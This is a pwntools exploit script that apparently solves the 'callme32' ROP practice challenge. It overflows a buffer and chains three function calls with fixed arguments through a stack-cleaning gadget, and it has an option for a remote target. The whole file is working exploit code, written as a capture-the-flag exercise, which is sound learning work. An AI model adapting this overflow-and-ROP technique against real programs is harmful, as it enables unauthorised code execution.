import pwn

#pwn.context.log_level = "debug"
remote = False

IP = ""
PORT = ""
FILENAME = "./callme32"

if remote:
    p = pwn.remote(IP, PORT)
    elf = pwn.ELF(FILENAME)
else:
    p = pwn.process(FILENAME)
    elf = p.elf

p.recvuntil("> ")

triple_pop = pwn.pack(0x080487f9) # pop esi; pop edi; pop ebp; ret;

payload = b"A"*44 # 44 bytes to esp

# call callme_one with those hex values as args
# triple pop to clean the stack from those 3 args
payload += pwn.pack(elf.sym['callme_one'])
payload += triple_pop
payload += pwn.pack(0xdeadbeef)
payload += pwn.pack(0xcafebabe)
payload += pwn.pack(0xd00df00d)

# next return is here, same logic as above
payload += pwn.pack(elf.sym['callme_two'])
payload += triple_pop
payload += pwn.pack(0xdeadbeef)
payload += pwn.pack(0xcafebabe)
payload += pwn.pack(0xd00df00d)

# repeat
payload += pwn.pack(elf.sym['callme_three'])
payload += triple_pop
payload += pwn.pack(0xdeadbeef)
payload += pwn.pack(0xcafebabe)
payload += pwn.pack(0xd00df00d)

p.sendline(payload)


p.interactive()
